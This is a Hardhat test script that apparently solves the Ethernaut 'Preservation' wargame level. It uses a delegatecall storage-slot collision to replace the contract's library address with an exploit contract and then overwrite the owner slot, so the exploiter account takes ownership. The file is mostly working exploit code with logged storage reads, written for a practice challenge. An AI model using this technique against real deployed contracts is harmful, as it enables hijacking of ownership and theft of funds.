
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";

describe("PreservationExploit", async () =>{

  it("Should get ownership", async () =>{
    await deployments.fixture(["LibraryContract","Preservation","PreservationExploit"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc=await ethers.getSigner(exploiter)
    const preservationDeployment=await deployments.get('Preservation')
    const preservationExploitDeployment=await deployments.get('PreservationExploit')
    const libraryContract1Deployment=await deployments.get('LibraryContract1')
    //const libraryContract2Deployment=await deployments.get('LibraryContract2')

    
    const preservation = await ethers.getContractAt('Preservation',preservationDeployment.address)
    const preservationExploit = await ethers.getContractAt('PreservationExploit',preservationExploitDeployment.address)
    const libraryContract1 = await ethers.getContractAt('LibraryContract',libraryContract1Deployment.address)
    //const libraryContract2 = await ethers.getContractAt('LibraryContract',libraryContract2Deployment.address)

    console.log(`Exploiter address: ${exploiter}`)
    console.log(`Library contract 1 address: ${libraryContract1.address}`)
    console.log(`PreservationExploit address: ${preservationExploit.address}`)


    console.log(`Preservation slot 0 (timeZone1Library address): ${await ethers.provider.getStorageAt(preservation.address,0)}`)
    console.log(`Preservation slot 2 (owner address): ${await ethers.provider.getStorageAt(preservation.address,2)}`)
    
    //Idea: new contract which changes slot3 value. So we change slot 1 value to this new contract address and then we change slot 3 by calling one of the setter functions
    
    await preservation.connect(exploiterAcc).setFirstTime(ethers.BigNumber.from(preservationExploit.address))
    console.log(`Preservation slot 0 (timeZone1Library address): ${await ethers.provider.getStorageAt(preservation.address,0)}`)
    
    console.log(`Preservation slot 2 (owner address): ${await ethers.provider.getStorageAt(preservation.address,2)}`)
    await preservation.connect(exploiterAcc).setFirstTime(ethers.BigNumber.from(exploiter))
    console.log(`Preservation slot 2 (owner address): ${await ethers.provider.getStorageAt(preservation.address,2)}`)

    expect(await preservation.owner(),"The exploit failed").to.be.equal(exploiter)

  });
});
